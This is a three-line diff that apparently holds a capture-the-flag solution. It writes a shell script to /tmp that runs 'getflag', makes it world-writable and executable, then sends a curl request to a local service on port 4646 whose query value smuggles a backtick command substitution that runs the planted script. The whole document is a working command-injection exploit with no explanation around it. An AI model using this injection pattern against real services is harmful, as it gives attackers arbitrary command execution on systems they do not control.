@@ -1,0 +1,3 @@
+echo $'#! /bin/sh\n`getflag>/tmp/token`' > /tmp/TEST
+chmod 777 /tmp/TEST
+curl localhost:4646?x='`/*/TEST`'
